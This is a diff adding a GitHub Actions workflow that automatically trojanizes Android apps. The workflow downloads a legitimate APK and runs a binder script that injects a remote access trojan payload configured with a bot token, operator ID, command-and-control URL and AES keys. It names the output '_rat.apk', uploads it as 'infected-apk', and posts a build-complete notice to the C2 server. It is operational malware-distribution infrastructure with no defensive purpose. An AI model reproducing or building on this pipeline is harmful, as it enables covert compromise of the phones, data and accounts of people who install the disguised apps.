@@ -1,0 +1,82 @@
+name: APK Builder - Auto Bind
+
+on:
+  repository_dispatch:
+    types: [build-apk]
+
+jobs:
+  build-infected-apk:
+    name: Build Bound APK
+    runs-on: ubuntu-latest
+    outputs:
+      apk_name: ${{ steps.set-name.outputs.apk_name }}
+    
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+
+      - name: Install apktool
+        run: |
+          sudo wget -q https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar -O /usr/local/bin/apktool.jar
+          sudo sh -c 'echo "#!/bin/bash\nexec java -jar /usr/local/bin/apktool.jar \"\$@\"" > /usr/local/bin/apktool'
+          sudo chmod +x /usr/local/bin/apktool
+          apktool --version
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install Python dependencies
+        run: |
+          pip install pycryptodome requests
+
+      - name: Download legitimate APK
+        run: |
+          wget -q "${{ github.event.client_payload.apk_url }}" -O input.apk
+          ls -lh input.apk
+
+      - name: Extract original app name
+        id: set-name
+        run: |
+          # Get original filename from URL or use default
+          ORIGINAL_NAME="${{ github.event.client_payload.apk_name }}"
+          CLEAN_NAME="${ORIGINAL_NAME%.apk}"
+          echo "apk_name=${CLEAN_NAME}_rat.apk" >> $GITHUB_OUTPUT
+
+      - name: Run APK Binder
+        run: |
+          python3 builder/binder.py \
+            --input input.apk \
+            --output "${{ steps.set-name.outputs.apk_name }}" \
+            --bot-token "${{ secrets.BOT_TOKEN }}" \
+            --operator-id "${{ secrets.OPERATOR_ID }}" \
+            --c2-url "${{ secrets.C2_URL }}" \
+            --aes-key "${{ secrets.AES_KEY }}" \
+            --aes-iv "${{ secrets.AES_IV }}" \
+            --payload-dir client/RatPayload
+
+      - name: Upload bound APK as artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: infected-apk
+          path: ${{ steps.set-name.outputs.apk_name }}
+          retention-days: 3
+
+      - name: Send bound APK via Dispatch Callback
+        run: |
+          # Notify the C2 server that the build is complete
+          curl -X POST "${{ secrets.C2_URL }}/api/build-complete" \
+            -H "Authorization: Bearer ${{ secrets.BUILDER_SECRET }}" \
+            -H "Content-Type: application/json" \
+            -d '{
+              "run_id": "${{ github.run_id }}",
+              "apk_name": "${{ steps.set-name.outputs.apk_name }}",
+              "artifact_url": "https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
+            }'
